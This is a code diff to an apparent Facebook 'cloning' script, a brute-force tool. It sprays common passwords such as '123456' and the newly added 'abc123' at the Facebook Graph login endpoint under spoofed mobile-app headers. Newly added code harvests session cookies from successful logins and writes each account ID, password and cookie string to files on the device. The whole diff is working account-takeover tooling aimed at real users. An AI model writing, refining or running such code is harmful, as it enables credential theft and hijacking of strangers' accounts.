@@ -391,7 +391,15 @@ def START_SERIES_CLONING(series_code):
     linex()
     input(f'\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;46m!\033[1;37m')
     main()
-        
+
+# Simple Cookie Logic - Add this function before login1        
+def get_cookies(response):
+    cookies = ""
+    if hasattr(response, 'cookies'):
+        for cookie in response.cookies:
+            cookies += f"{cookie.name}={cookie.value}; "
+    return cookies.strip("; ")
+
 def login1(uid):
     global oks, loop, cps
     Session = requests.session()
@@ -401,7 +409,7 @@ def login1(uid):
         )
         sys.stdout.flush()
         ua = random.choice(ugen)
-        for pw in ["123456","1234567","12345678","123456789","1234567890","123123"]:
+        for pw in ["123456","1234567","12345678","123456789","1234567890","123123","abc123"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -426,66 +434,43 @@ def login1(uid):
             head = {'User-Agent': ua,
             'Content-Type': 'application/x-www-form-urlencoded', 
             'Host': 'graph.facebook.com', 
-            'X-FB-Net-HNI': str(random.choice([45201, 45206, 45404, 45205, 45403, 45204, 45207])),
-            'X-FB-SIM-HNI': str(random.choice([45201, 45206, 45404, 45205, 45403, 45204])),
-            'X-FB-Connection-Type': random.choice(['MOBILE.LTE', 'WIFI', 'MOBILE.EDGE', '4G']),
+            'X-FB-Net-HNI': '25227',
+            'X-FB-SIM-HNI': '29752',
+            'X-FB-Connection-Type': 'MOBILE.LTE', 
             'X-Tigon-Is-Retry': 'False', 
-            'x-fb-session-id': f'nid=jiZ+yNNBgbwC;pid=Main;tid={random.randint(130,140)};nc=1;fc=0;bc=0;cid={str(uuid.uuid4())[:32]}', 
-            'x-fb-device-group': str(random.choice([5120, 5121, 5122, 5123, 5124])),
-            'X-FB-Friendly-Name': random.choice(['ViewerReactionsMutation', 'authenticate', 'AuthenticateUser']),
+            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
+            'x-fb-device-group': '5120', 
+            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
             'X-FB-Request-Analytics-Tags': 'graphservice', 
             'X-FB-HTTP-Engine': 'Liger', 
             'X-FB-Client-IP': 'True', 
             'X-FB-Server-Cluster': 'True', 
-            'x-fb-connection-token': str(uuid.uuid4())[:32],
-            'Accept-Encoding': 'gzip, deflate',
-            'Accept': '*/*',
-            'Connection': 'keep-alive',
-            'X-FB-Client-Name': 'FBAndroidSDK',
-            'X-FB-Client-Version': random.choice(['15.0.0', '14.2.0', '16.1.0', '15.2.1']),
-            'Authorization': f'OAuth {data["access_token"]}',
-            'X-FB-API-Version': 'v15.0',
-            'X-FB-Background-State': '1',
-            'X-FB-Request-Type': 'api',
-            'Priority': 'u=3, i',
-            'Content-Length': str(len('&'.join([f'{k}={v}' for k, v in data.items()])))}
+            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
+            'Content-Length': '706'}
             url = "https://b-graph.facebook.com/auth/login"
-            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
+            response = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True)
+            
+            # Get cookies from response
+            cookies = get_cookies(response)
+            
+            rp = response.json()
             if "session_key" in rp:
-                cookies = ";".join([f"{i['name']}={i['value']}" for i in rp.get('session_cookies', [])])
                 oks.append(uid)
                 open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
-                print(f'\033[38;5;46m{uid}|{pw}|{cookies}\033[1;97m')
+                print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw} ● {cookies[:50]}...\033[1;97m')
                 break
 
-            elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
-                cookies = ";".join([f"{i.get('name')}={i.get('value')}" for i in rp.get('session_cookies', [])]) if "session_cookies" in rp else "NO-COOKIE"
+            elif "www.facebook.com" in rp['error']['message']:
                 cps.append(uid)
-                open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
-                
-                # Check CP reason
-                error_msg = rp.get('error', {}).get('message', '').lower()
-                if "security" in error_msg:
-                    cp_reason = "SECURITY-CHECK"
-                elif "verify" in error_msg or "verification" in error_msg:
-                    cp_reason = "PHONE-VERIFICATION"
-                elif "suspicious" in error_msg:
-                    cp_reason = "SUSPICIOUS-ACTIVITY"
-                elif "blocked" in error_msg:
-                    cp_reason = "TEMPORARILY-BLOCKED"
-                elif "confirm" in error_msg:
-                    cp_reason = "IDENTITY-CONFIRM"
-                else:
-                    cp_reason = "GENERAL-CHECKPOINT"
-                
-                print(f'\033[38;5;196m{uid}|{pw}|{cookies}|CP-REASON:{cp_reason}\033[1;97m')
+                open("/sdcard/OLD_CLONING-CP.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
+                print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw} ● {cookies[:50]}...\033[1;97m')             
                 break
+            else:continue
+        loop+=1
+    except Exception as e:time.sleep(30)
 
-            else:
-                continue
-        loop += 1
-    except Exception as e:
-        time.sleep(5)
+if __name__ == "__main__":
+    main()
 
 if __name__ == "__main__":
     main()		
